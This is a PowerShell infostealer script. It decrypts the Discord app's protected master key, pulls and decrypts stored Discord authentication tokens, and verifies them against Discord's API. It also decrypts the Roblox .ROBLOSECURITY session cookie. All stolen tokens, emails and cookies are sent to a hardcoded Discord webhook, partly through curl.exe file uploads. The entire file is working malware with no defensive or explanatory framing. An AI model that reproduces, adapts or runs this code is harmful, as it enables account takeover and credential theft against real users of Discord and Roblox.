$ErrorActionPreference = "Continue"
$WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
$debugFile = "$env:TEMP\ps_debug.txt"
$outfile = "$env:TEMP\steal_result.txt"

"Started at $(Get-Date)" | Out-File $debugFile -Force

function dbg($title, $desc, $color) {
    $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
    try { 
        Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null 
        "Sent webhook: $title" | Out-File $debugFile -Append
    } catch {
        "Failed to send webhook: $_" | Out-File $debugFile -Append
    }
}

"Starting token grab" | Out-File $debugFile -Append
$appdata = $env:APPDATA
$l = $env:LOCALAPPDATA
$mk = $null

try {
    $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
    $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
    $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
    "Keymaster decrypted" | Out-File $debugFile -Append
} catch {
    "Failed to decrypt keymaster: $_" | Out-File $debugFile -Append
}

if ($mk) {
    $discordPaths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb")
    foreach ($dp in $discordPaths) {
        if (!(Test-Path $dp)) { continue }
        Get-ChildItem $dp | Where-Object { $_.Name -match '\.(ldb|log)$' } | ForEach-Object {
            $raw = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            if ($raw) {
                foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
                    $b64 = $m.Groups[1].Value
                    while ($b64.Length % 4 -ne 0) { $b64 += '=' }
                    try {
                        $eb = [Convert]::FromBase64String($b64)
                        if ($eb.Length -lt 80) { continue }
                        $nonce = $eb[3..14]
                        $ct = $eb[15..($eb.Length-17)]
                        Add-Type -AssemblyName System.Security
                        $csharp = @"
using System;
using System.Security.Cryptography;
public class Gcm {
    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct) {
        using (var aes = Aes.Create()) {
            aes.Key = key; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.None;
            byte[] o = new byte[ct.Length];
            byte[] c = new byte[16]; Array.Copy(nonce, c, 12); c[15] = 2;
            using (var e = aes.CreateEncryptor()) {
                for (int i = 0; i < ct.Length; i += 16) {
                    byte[] k = e.TransformFinalBlock(c, 0, 16);
                    int n = Math.Min(16, ct.Length - i);
                    for (int j = 0; j < n; j++) o[i + j] = (byte)(ct[i + j] ^ k[j]);
                    for (int j = 15; j >= 12; j--) { if (++c[j] != 0) break; }
                }
            }
            return o;
        }
    }
}
"@
                        Add-Type -TypeDefinition $csharp -Language CSharp
                        $decrypted = [Gcm]::Decrypt($mk, $nonce, $ct)
                        $token = [Text.Encoding]::UTF8.GetString($decrypted).TrimEnd([char]0)
                        "Found token: $token" | Out-File $debugFile -Append
                        
                        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$token} -TimeoutSec 5 -ErrorAction SilentlyContinue
                        if ($r.username) {
                            $info = "**User:** $($r.username)`n**Email:** $($r.email)`n**Token:** $token"
                            dbg ":gift: Discord Token" $info 5793266
                        }
                    } catch {
                        "Token error: $_" | Out-File $debugFile -Append
                    }
                }
            }
        }
    }
}

"Starting Roblox cookie grab" | Out-File $debugFile -Append
$rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat")
foreach ($rp in $rbxPaths) {
    if (Test-Path $rp) {
        try {
            $raw = Get-Content $rp -Raw
            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                $eb = [Convert]::FromBase64String($Matches[1])
                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                $cookie = [Text.Encoding]::UTF8.GetString($db)
                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
                    $c = $Matches[1]
                    "Found Roblox cookie: $($c.Length) bytes" | Out-File $debugFile -Append
                    dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
                    $tmp_c = "$env:TEMP\cookie.txt"
                    Set-Content -Path $tmp_c -Value $c -NoNewline
                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
                    Remove-Item $tmp_c -Force
                }
            }
        } catch {
            "Roblox cookie error: $_" | Out-File $debugFile -Append
        }
    }
}

"Finished" | Out-File $debugFile -Append
